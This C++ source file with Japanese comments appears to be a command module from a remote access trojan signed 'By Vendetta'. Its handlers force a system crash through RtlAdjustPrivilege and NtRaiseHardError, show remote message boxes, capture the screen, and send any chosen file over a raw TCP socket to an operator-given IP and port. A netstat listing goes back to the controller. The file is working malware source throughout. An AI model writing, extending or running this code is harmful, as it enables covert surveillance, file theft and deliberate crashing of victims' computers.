// その他のコマンド等
#include "Misc.h"
#include "NtAPi.h"

// NtRaiseHardErrorを直接呼び出してシステムクラッシュ
void SystemCrash(std::vector<std::string>& tokens) {
    
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, true, false, nullptr);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, nullptr);

}

// メッセージボックスを表示
void ShowMessageBox(std::vector<std::string>& tokens) {
    // デフォルトのメッセージとタイトル
    std::string defaultMessage = "By Vendetta";
    std::string defaultTitle = "Hello";

    if (tokens.size() > 1) {
        defaultTitle = tokens[2];
    }
    if (tokens.size() > 2) {
        defaultMessage = tokens[1];
    }

    std::thread([defaultMessage, defaultTitle]() {
        MessageBoxA(0, defaultMessage.c_str(), defaultTitle.c_str(), MB_OK);

        }).detach();

    SendString("[+] メッセージボックスを表示しました");
}


void CaptureScreenshot(const std::string& filename) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // ビットマップデータをファイルに書き込む
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // RGB
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // ファイル作成
    FILE* file;
    fopen_s(&file, filename.c_str(), "wb");
    if (file == NULL) {
        SendString("[-] スクショファイルの作成に失敗");
        return;
    }

    // ヘッダーを書き込む
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + width * height * 3;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

    BYTE* pPixels = new BYTE[width * height * 3];
    GetDIBits(hMemoryDC, hBitmap, 0, height, pPixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    fwrite(pPixels, width * height * 3, 1, file);

    delete[] pPixels;
    fclose(file);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}



void screenshot(std::vector<std::string>& tokens) {
    std::string filename = "screenshot.bmp";
    CaptureScreenshot(filename);
}

void TransmitFileChunked(SOCKET s, HANDLE hFile, DWORD fileSize) {
    const DWORD bufferSize = 4096;  // 4KBのチャンクサイズ
    char buffer[bufferSize];
    DWORD bytesRead = 0;
    DWORD totalBytesSent = 0;

    // ファイルの内容をチャンクごとに読み込みながら送信
    while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
        int bytesSent = 0;
        while (bytesSent < bytesRead) {
            int result = send(s, buffer + bytesSent, bytesRead - bytesSent, 0);
            if (result == SOCKET_ERROR) {
                closesocket(s);
                return;
            }
            bytesSent += result;
        }
        totalBytesSent += bytesRead;
    }
}
#include <future>


void UploadFile(std::vector<std::string>& tokens) {
    if (tokens.size() < 4) {
        SendString("Usage: uploadfile <filename> <ip> <port>");
        return;
    }

    std::string filename = tokens[1];
    std::string ipAddress = tokens[2];
    int port = std::stoi(tokens[3]);

    // ファイルを開く
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        SendString("[-] Could not open the file.");
        return;
    }

    // サーバーのアドレス情報を設定（指定されたIPとポート）
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    // ソケット作成
    SOCKET uploadSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (uploadSocket == INVALID_SOCKET) {
        SendString("[-] Socket creation failed.");
        return;
    }

    // サーバーに接続
    if (connect(uploadSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        SendString("[-] Could not connect to the server.");
        closesocket(uploadSocket);
        return;
    }

    // ファイルハンドルを作成
    HANDLE fileHandle = CreateFileA(
        filename.c_str(),         // ファイル名
        GENERIC_READ,             // 読み取り権限
        FILE_SHARE_READ,          // 他プロセスと共有可能
        NULL,                     // デフォルトのセキュリティ属性
        OPEN_EXISTING,            // 既存のファイルを開く
        FILE_ATTRIBUTE_NORMAL,    // 通常のファイル属性
        NULL                      // テンプレートファイルなし
    );

    if (fileHandle == INVALID_HANDLE_VALUE) {
        SendString("[-] Could not open file handle.");
        closesocket(uploadSocket);
        return;
    }

    // ファイルサイズ取得
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        SendString("[-] Failed to get file size.");
        CloseHandle(fileHandle);
        closesocket(uploadSocket);
        return;
    }

    // ファイル送信
    SendString("Sending file: " + filename + " (Size: " + std::to_string(fileSize.QuadPart) + " bytes)");

    BOOL result = TransmitFile(
        uploadSocket,          // ソケット
        fileHandle,            // ファイルハンドル
        0,                     // 全体のファイルサイズ（0はすべて送信）
        0,                     // 送信ごとのバイト数（0はデフォルト）
        NULL,                  // オーバーラップ構造体
        NULL,                  // ヘッダー/トレーラー用のバッファ
        0                      // フラグ
    );

    if (!result) {
        SendString("[-] File send failed.");
    }
    else {
        SendString("[+] File upload complete.");
    }

    // クリーンアップ
    CloseHandle(fileHandle);
    closesocket(uploadSocket);
}


void Netstat(std::vector<std::string>& tokens) {
    if (tokens.size() != 1 || tokens[0] != "netstat") {
        SendString("使用方法: netstat");
        return;
    }
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    if (GetExtendedTcpTable(nullptr, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == ERROR_INSUFFICIENT_BUFFER) {
        auto tcpTable = (PMIB_TCPTABLE)malloc(dwSize);
        if (tcpTable == nullptr) {
            SendString("[-] メモリ割り当てに失敗しました");
            return;
        }

        dwRetVal = GetExtendedTcpTable(tcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        if (dwRetVal != NO_ERROR) {
            SendString("[-] TCPテーブルの取得に失敗しました");
            free(tcpTable);
            return;
        }

        std::ostringstream result;
        result << "アクティブな接続\n\n";

        // 列幅の定義
        const int protocolWidth = 15;
        const int addressWidth = 35;
        const int stateWidth = 20;

        // ヘッダーの出力
        result << std::left
            << std::setw(protocolWidth) << "プロトコル"
            << std::setw(addressWidth) << "ローカル アドレス"
            << std::setw(addressWidth) << "外部アドレス"
            << "状態\n";

        for (unsigned int i = 0; i < tcpTable->dwNumEntries; i++) {
            struct in_addr localIp, remoteIp;
            localIp.S_un.S_addr = tcpTable->table[i].dwLocalAddr;
            remoteIp.S_un.S_addr = tcpTable->table[i].dwRemoteAddr;
            unsigned short localPort = ntohs((unsigned short)(tcpTable->table[i].dwLocalPort));
            unsigned short remotePort = ntohs((unsigned short)(tcpTable->table[i].dwRemotePort));

            // 状態の設定
            const char* state;
            switch (tcpTable->table[i].dwState) {
            case MIB_TCP_STATE_ESTAB: state = "ESTABLISHED"; break;
            case MIB_TCP_STATE_LISTEN: state = "LISTENING"; break;
            case MIB_TCP_STATE_CLOSE_WAIT: state = "CLOSE_WAIT"; break;
            case MIB_TCP_STATE_LAST_ACK: state = "LAST_ACK"; break;
            default: state = "UNKNOWN"; break;
            }

            // IPアドレスとポートを結合
            std::ostringstream localAddr, remoteAddr;
            localAddr << inet_ntoa(localIp) << ":" << localPort;
            remoteAddr << inet_ntoa(remoteIp) << ":" << remotePort;

            // 整形された行を出力
            result << std::left
                << std::setw(protocolWidth) << "TCP"
                << std::setw(addressWidth) << localAddr.str()
                << std::setw(addressWidth) << remoteAddr.str()
                << state << "\n";
        }

        SendString(result.str().empty() ? "アクティブなTCP接続はありません" : result.str());
        free(tcpTable);
    }
    else {
        SendString("[-] TCPテーブルのサイズを取得できませんでした");
    }
}